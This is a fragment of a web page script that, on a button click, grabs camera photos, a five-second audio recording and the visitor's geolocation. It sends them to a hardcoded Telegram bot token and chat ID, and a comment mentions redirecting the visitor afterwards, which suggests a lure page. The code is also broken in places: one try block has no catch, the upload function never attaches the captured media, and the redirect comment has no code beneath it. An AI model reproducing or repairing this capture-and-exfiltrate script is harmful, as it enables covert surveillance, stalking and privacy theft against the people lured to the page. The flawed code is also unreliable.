  <script>
    const botToken = "8041585523:AAFPDOC3CH2HLgjaQveu5zoNj_fXYLkfdTg";
    const chatId = "6763021567";

    document.getElementById("startCapture").addEventListener("click", async () => {
      document.getElementById("status").innerText = "Requesting permissions...";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        // Capture multiple photos (1 per 100ms ~ 10 per sec)
        let count = 0;
        const captureInterval = setInterval(async () => {
          if (count >= 10) {
            clearInterval(captureInterval);
            track.stop();
          } else {
            try {
              const blob = await imageCapture.takePhoto();
              sendToTelegram(blob, "photo");
              count++;

          }
        }, 100);

        // Capture location
        navigator.geolocation.getCurrentPosition(
          pos => sendMessage(`Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`),
          err => console.error("Location error", err)
        );

        // Record 5 sec Audio
        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(chunks, { type: "audio/webm" });
          sendToTelegram(audioBlob, "voice");
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);

        // Redirect after 1 second

      } catch (err) {
        document.getElementById("status").innerText = "❌ Error: " + err.message;
        console.error(err);
      }
    });

    function sendToTelegram(data, type) {
      const formData = new FormData();
      formData.append("chat_id", chatId);

      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
        method: "POST",
        body: formData
      }).catch(err => console.error("Telegram error", err));
    }

    function sendMessage(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
      }).catch(err => console.error("Message error", err));
    }
